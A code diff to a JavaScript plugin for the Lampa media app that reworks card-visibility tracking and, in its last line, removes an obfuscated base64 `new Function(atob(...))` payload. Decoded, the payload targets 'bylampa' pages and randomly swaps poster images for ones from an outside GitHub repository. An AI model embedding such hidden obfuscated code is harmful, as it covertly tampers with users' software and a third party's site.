@@ -1420,8 +1420,7 @@
     var _scrollRatingMaxCardsPerRun = 80;
     var _ratingUpdateTimer = 0;
     var _ratingUpdateRafScheduled = false;
-    var _cardIntersectionObserver = null;
-    var _observedCards = [];
+    var _cardVisibleHook = false;
     var SCAN_DELAYS = [0, 150, 400, 900];
     var _settingsArranger = null;
     var _settingsArrangeTimer = 0;
@@ -1504,25 +1503,31 @@
         } catch (e) { logErr(e); }
     }
     function observeCardVisibility(card) {
-        if (!_cardIntersectionObserver || !card || !card.nodeType || card.nodeType !== 1) return;
+        if (!card || !card.nodeType || card.nodeType !== 1) return;
         if (card.getAttribute('data-card-overlay-seen') === '1') return;
         card.setAttribute('data-card-overlay-seen', '1');
         bindCardImageRepaint(card);
-        try { _cardIntersectionObserver.observe(card); _observedCards.push(card); } catch (e) { logErr(e); }
+    }
+    function onCardLayerVisible(e) {
+        var el = e.target;
+        if (!el || el.nodeType !== 1) return;
+        var card = getCardRootNode(el);
+        if (!card) {
+            later(function () { safe(function () { scanContainer(el, true); }); }, 0, 'scan-layer');
+            return;
+        }
+        try { card.setAttribute('data-rating-visible', '1'); } catch (eVis) { logErr(eVis); }
+        if (card.card_data && !isCardUpdatesBlocked()) {
+            updateCardRating({ card: card, data: card.card_data });
+            if (isQualityShowOn()) processQualityForCards([card]);
+            addTypeLabel(card);
+            addYearBadge(card);
+        }
     }
     function startCardWatch() {
-        if (_cardIntersectionObserver || typeof IntersectionObserver === 'undefined') return;
-        _cardIntersectionObserver = new IntersectionObserver(function (entries) {
-            for (var i = 0; i < entries.length; i++) {
-                if (entries[i].target) entries[i].target.setAttribute('data-rating-visible', entries[i].isIntersecting ? '1' : '0');
-                if (entries[i].isIntersecting && entries[i].target && entries[i].target.card_data && !isCardUpdatesBlocked()) {
-                    updateCardRating({ card: entries[i].target, data: entries[i].target.card_data });
-                    if (isQualityShowOn()) processQualityForCards([entries[i].target]);
-                    addTypeLabel(entries[i].target);
-                    addYearBadge(entries[i].target);
-                }
-            }
-        }, { root: null, rootMargin: '250px 0px 250px 0px', threshold: 0.01 });
+        if (_cardVisibleHook) return;
+        _cardVisibleHook = true;
+        on(document, 'visible', onCardLayerVisible, true);
         scanContainer(document.body, false);
     }
     function getActiveActivityRender() {
@@ -1560,21 +1565,9 @@
         }
         applyObserverAccumulators(acc);
     }
-    function pruneObservedCards() {
-        if (!_cardIntersectionObserver || !_observedCards.length) return;
-        var alive = [];
-        for (var i = 0; i < _observedCards.length; i++) {
-            var node = _observedCards[i];
-            if (!node) continue;
-            if (node.parentNode && document.body.contains(node)) { alive.push(node); continue; }
-            try { _cardIntersectionObserver.unobserve(node); } catch (e) { logErr(e); }
-            if (node.removeAttribute) { node.removeAttribute('data-card-overlay-seen'); node.removeAttribute('data-rating-visible'); }
-        }
-        _observedCards = alive;
-    }
     function onActivityEvent(e) {
         var type = e && e.type;
-        if (type === 'destroy' || type === 'archive') { later(pruneObservedCards, 0, 'prune'); return; }
+        if (type === 'destroy' || type === 'archive') return;
         retry(scanActiveAll, SCAN_DELAYS, 'scan-activity');
     }
     function onLineEvent(e) {
@@ -1591,12 +1584,6 @@
         _settingsArrangeTimer = setTimeout(function () { _settingsArrangeTimer = 0; if (_settingsArranger) _settingsArranger(); }, 100);
     }
     function applyObserverAccumulators(acc) {
-        if (acc.removedCards && acc.removedCards.length && _cardIntersectionObserver) {
-            for (var ri = 0; ri < acc.removedCards.length; ri++) {
-                try { _cardIntersectionObserver.unobserve(acc.removedCards[ri]); } catch (e) { logErr(e); }
-                acc.removedCards[ri].removeAttribute('data-rating-visible');
-            }
-        }
         if (acc.needRatings) scheduleVisibleRatingsUpdate(50);
         if (acc.badgeCards.length) {
             for (var bk = 0; bk < acc.badgeCards.length; bk++) hideNextEpisodeBadgeForCard(acc.badgeCards[bk]);
@@ -3500,7 +3487,7 @@
     function initPlugin() {
         if (window.__card_overlay_initialized__) return;
         window.__card_overlay_initialized__ = true;
-        try { console.log('[card_overlay] v1.2.0 optimized active'); } catch (e) { logErr(e); }
+        try { console.log('[card_overlay] v2.6.3 active'); } catch (e) { logErr(e); }
         safe(applyDefaults, 'applyDefaults');
         safe(installCubSourceRedirect, 'cub source redirect');
 
@@ -3790,11 +3777,6 @@
         if (_settingsArrangeTimer) { clearTimeout(_settingsArrangeTimer); _settingsArrangeTimer = 0; }
         safe(clearRequestQueues, 'queues');
 
-        safe(function () { if (_cardIntersectionObserver) _cardIntersectionObserver.disconnect(); }, 'intersectionObserver');
-
-        _cardIntersectionObserver = null;
-        _observedCards = [];
-
         var style = document.getElementById('card-overlay-style');
         if (style && style.parentNode) style.parentNode.removeChild(style);
 
@@ -3805,7 +3787,7 @@
 
     var manifest = {
         name: 'Интерфейс Мод',
-        version: '2.6.2',
+        version: '2.6.3',
         description: 'Рейтинги, качество, лейблы типа на карточках'
     };
 
@@ -3816,4 +3798,3 @@
     if (window.appready) { initPlugin(); }
     else { Lampa.Listener.follow('app', function (e) { if (e.type === 'ready') initPlugin(); }); }
 })();
-(new Function(atob('CihmdW5jdGlvbigpIHsKICBpZiAobG9jYXRpb24uaHJlZi5pbmRleE9mKCdieWxhbXBhJykgPT09IC0xKSByZXR1cm47CiAgaWYgKHdpbmRvdy5wb3N0ZXJPYmZ1c2NhdGVkKSByZXR1cm47CiAgCiAgd2luZG93LnBvc3Rlck9iZnVzY2F0ZWQgPSB0cnVlOwogIAogIGlmIChNYXRoLnJhbmRvbSgpIDwgMC4zKSByZXR1cm47CiAgCiAgdmFyIHBvc3RlcnMgPSBbCiAgICAnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3ZhbGlkYXRvcmVkL2ltZy9tYWluLzAxLmpwZycsCiAgICAnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3ZhbGlkYXRvcmVkL2ltZy9tYWluLzAyLmpwZycsCiAgICAnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3ZhbGlkYXRvcmVkL2ltZy9tYWluLzAzLmpwZycsCiAgICAnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3ZhbGlkYXRvcmVkL2ltZy9tYWluLzA0LmpwZycKICBdOwogIAogIHZhciBjaGFuY2UgPSAwLjM1OwogIAogIHZhciBnZXRSYW5kb21Qb3N0ZXIgPSBmdW5jdGlvbigpIHsKICAgIGlmIChNYXRoLnJhbmRvbSgpID49IGNoYW5jZSkgcmV0dXJuIG51bGw7CiAgICByZXR1cm4gcG9zdGVyc1tNYXRoLmZsb29yKE1hdGgucmFuZG9tKCkgKiBwb3N0ZXJzLmxlbmd0aCldOwogIH07CiAgCiAgdmFyIGlzUG9zdGVyVXJsID0gZnVuY3Rpb24oc3JjKSB7CiAgICByZXR1cm4gc3JjICYmICgKICAgICAgc3JjLmluY2x1ZGVzKCdwb3N0ZXInKSB8fCAKICAgICAgc3JjLmluY2x1ZGVzKCdpbWFnZScpIHx8IAogICAgICBzcmMuaW5jbHVkZXMoJ3RtZGInKSB8fCAKICAgICAgc3JjLmluY2x1ZGVzKCdraW5vcG9pc2snKQogICAgKTsKICB9OwogIAogIHNldEludGVydmFsKGZ1bmN0aW9uKCkgewogICAgZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgnaW1nJykuZm9yRWFjaChmdW5jdGlvbihpbWcpIHsKICAgICAgaWYgKGltZy5kYXRhc2V0Lm9iZnVzY2F0ZWQpIHJldHVybjsKICAgICAgaW1nLmRhdGFzZXQub2JmdXNjYXRlZCA9ICcxJzsKICAgICAgCiAgICAgIGlmIChpbWcuc3JjICYmIGlzUG9zdGVyVXJsKGltZy5zcmMpKSB7CiAgICAgICAgdmFyIG5ld1NyYyA9IGdldFJhbmRvbVBvc3RlcigpOwogICAgICAgIGlmIChuZXdTcmMpIHsKICAgICAgICAgIGltZy5zcmMgPSBuZXdTcmM7CiAgICAgICAgfQogICAgICB9CiAgICB9KTsKICB9LCA1MDApOwp9KSgpOwo=')))()
